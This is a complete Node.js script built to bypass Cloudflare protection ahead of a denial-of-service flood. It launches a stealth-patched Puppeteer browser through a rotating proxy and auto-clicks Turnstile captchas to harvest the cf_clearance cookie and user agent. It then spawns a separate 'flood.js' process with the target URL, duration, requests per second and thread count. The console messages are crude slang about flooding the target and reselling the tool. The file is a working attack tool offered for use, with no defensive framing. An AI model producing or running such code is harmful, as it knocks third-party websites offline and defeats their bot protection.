const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());
const { spawn } = require('child_process');
var Xvfb = require('xvfb');
const fs = require('fs');

const global = {
  browserLength: 0,
  timeOut: 30000 // 30 seconds
};

function checkTimeOut(startTime, endTime = new Date().getTime()) {
  return (endTime - startTime) > global.timeOut;
}

function formatLanguage(languages) {
  let str = '';
  if (languages[0]) str += `${languages[0]},${languages[1]};q=0.9`;
  if (languages[2]) str += `,${languages[2]};q=0.8`;
  if (languages[3]) str += `,${languages[3]};q=0.7`;
  return str;
}

async function browserCreator({ proxy = {}, agent = null }) {
  try {
    var solve_status = true;

    const setSolveStatus = ({ status }) => {
      solve_status = status;
    };

    const autoSolve = ({ page }) => {
      return new Promise(async (resolve, reject) => {
        while (solve_status) {
          try {
            await sleep(1500);
            await checkStat({ page: page }).catch(err => { });
          } catch (err) { }
        }
        resolve();
      });
    };

    setSolveStatus({ status: true });

    try {
      var xvfbsession = new Xvfb({
        silent: true,
        xvfb_args: ['-screen', '0', '1920x1080x24', '-ac']
      });
      xvfbsession.startSync();
    } catch (err) { }

    const browser = await puppeteer.launch({
      headless: false,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        (proxy && proxy.host && proxy.port) ? `--proxy-server=${proxy.host}:${proxy.port}` : "",
        "--window-size=1920,1080"
      ],
      defaultViewport: {
        width: 1920,
        height: 1080
      },
      ignoreHTTPSErrors: true,
      targetFilter: target => !!target.url(),
    });

    var page = await browser.pages();
    page = page[0];

    if (proxy.username && proxy.password) await page.authenticate({ username: proxy.username, password: proxy.password });

    if (agent) await page.setUserAgent(agent);

    browser.on('disconnected', async () => {
      try { xvfbsession.stopSync(); } catch (err) { }
      try { setSolveStatus({ status: false }) } catch (err) { }
    });

    autoSolve({ page: page, browser: browser });
    return { page, browser };
  } catch (err) {
    console.log(err.message);
    return false;
  }
}

const sleep = (ms) => {
  return new Promise(resolve => setTimeout(resolve, ms));
};

const checkStat = ({ page }) => {
    return new Promise(async (resolve, reject) => {

        var st = setTimeout(() => {
            clearInterval(st)
            resolve(false)
        }, 4000);
        try {

            const elements = await page.$$('[name="cf-turnstile-response"]');

            if (elements.length <= 0) return resolve(false);

            for (const element of elements) {
                try {
                    const parentElement = await element.evaluateHandle(el => el.parentElement);

                    const box = await parentElement.boundingBox();

                    let x = box.x + 30;
                    let y = box.y + box.height / 2;

                    await page.mouse.click(x, y);
                    try {
                        x += 30
                        await page.mouse.click(x, y);
                    } catch (err) { }
                    try {
                        x += 30
                        await page.mouse.click(x, y);
                    } catch (err) { }
                } catch (err) { }
            }
            clearInterval(st)
            resolve(true)
        } catch (err) {
            clearInterval(st)
            resolve(false)
        }
    })
}

async function scrape(options) {
  global.browserLength++;
  const startTime = new Date().getTime();
  let brw = null;
  let headers = {};

  try {
    const { page, browser } = await browserCreator({ proxy: options.proxy, agent: options.agent });
    brw = browser;

    if (options.defaultCookies) await page.setCookie(...options.defaultCookies);

    const browserLanguages = await page.evaluate(() => navigator.languages);
    headers['accept-language'] = formatLanguage(browserLanguages);

    await page.setExtraHTTPHeaders({
      'accept-language': headers['accept-language']
    });

    if (!options.agent) options.agent = await page.evaluate(() => navigator.userAgent);

    await page.setRequestInterception(true);

    page.on('request', (request) => {
      if (['stylesheet', 'font', 'image', 'media'].includes(request.resourceType())) {
        request.abort();
      } else {
        request.continue();
        if (request.url() === options.url) {
          const reqHeaders = request.headers();
          delete reqHeaders['cookie'];
          headers = { ...headers, ...reqHeaders, host: new URL(options.url).hostname };
        }
      }
    });

    page.on('response', async (response) => {
      if (response.url().includes('/verify/turnstile') && options.mode === 'captcha') {
        try {
          const responseBody = await response.json();
          if (responseBody && responseBody.token) {
            const cookies = await page.cookies();
            global.browserLength--;
            await browser.close();
            return { code: 200, cookies, agent: options.agent, proxy: options.proxy, url: options.url, headers, turnstile: responseBody };
          }
        } catch (err) { }
      } else if (options.mode === 'captcha') {
        const checkToken = await page.evaluate(() => {
          const cfItem = document.querySelector('[name="cf-turnstile-response"]');
          return cfItem && cfItem.value && cfItem.value.length > 0 ? cfItem.value : false;
        }).catch(err => false);
        if (checkToken) {
          const cookies = await page.cookies();
          global.browserLength--;
          await browser.close();
          return { code: 200, cookies, agent: options.agent, proxy: options.proxy, url: options.url, headers, turnstile: { token: checkToken } };
        }
      }
    });

    await page.goto(options.url, {
      waitUntil: ['load', 'networkidle0']
    });

    const blocked = await page.evaluate(() => {
      const bodyText = document.body.innerText || "";
      return document.title.includes("Sorry, you have been blocked") || bodyText.includes("Sorry, you have been blocked");
    });

    if (blocked) {
      console.log(`[LOG] Proxy ${options.proxy.host}:${options.proxy.port} Got Block [GEO]`);
      await browser.close();
      global.browserLength--;
      return { code: 403, message: "Blocked" };
    }

    if (options.mode === 'captcha') return;

    let cookies = false;

    while (!cookies) {
      try {
        cookies = await page.cookies();
        if (!cookies.find(cookie => cookie.name === 'cf_clearance')) cookies = false;
      } catch (err) {
        cookies = false;
      }
      await new Promise(resolve => setTimeout(resolve, 50));
      if (checkTimeOut(startTime)) {
        await browser.close();
        global.browserLength--;
        return { code: 500, message: 'Request Timeout' };
      }
    }

    headers['cookie'] = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

    await browser.close();
    global.browserLength--;

    return { code: 200, cookies, agent: options.agent, proxy: options.proxy, url: options.url, headers };
  } catch (err) {
    global.browserLength--;
    try { brw.close(); } catch (err) { }
    return { code: 500, message: err.message };
  }
}

const url = process.argv[2];
const time = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const thread = parseInt(process.argv[5], 10);
const proxyfile = process.argv[6];
const proxies = fs.readFileSync(proxyfile, "utf-8").toString().replace(/\r/g, "").split("\n").filter((word) => word.trim().length > 0);
const proxy = proxies[Math.floor(Math.random() * proxies.length)];

if (!url || !time || !rps || !thread || !proxyfile) {
  console.log(`Invalid Usage: node ${process.argv[1]} url time rps thread proxyfile\nNote:Coli Dulu Biar Work`);
  process.exit();
}

(async () => {
  const pxdata = proxy.split(":");
  console.log(`Setting Up the Browser\n`);
  const response = await scrape({
    url: url,
    proxy: {
      host: pxdata[0],
      port: pxdata[1],
    }
  });
  if (response.code === 200) {
    console.log(`Cloudpler Solped By Ambatukam\n\nTarget: ${url}\nCoolie: ${response.headers.cookie}\nUambatukam: ${response.agent}\n\nNote: Yg ressell nanti di cipok ambatukam loh`);
    const args = [
      'flood.js',
      url,
      time,
      rps,
      thread,
      `${pxdata[0]}:${pxdata[1]}`,
      response.headers.cookie,
      response.agent
    ];
    console.log(`\nAmabatukam Sedang Coli di web ${url}`);
    const child = spawn('node', args);
  } else {
    console.log(`[LOG] Request failed with message: ${response.message}`);
  }
})();
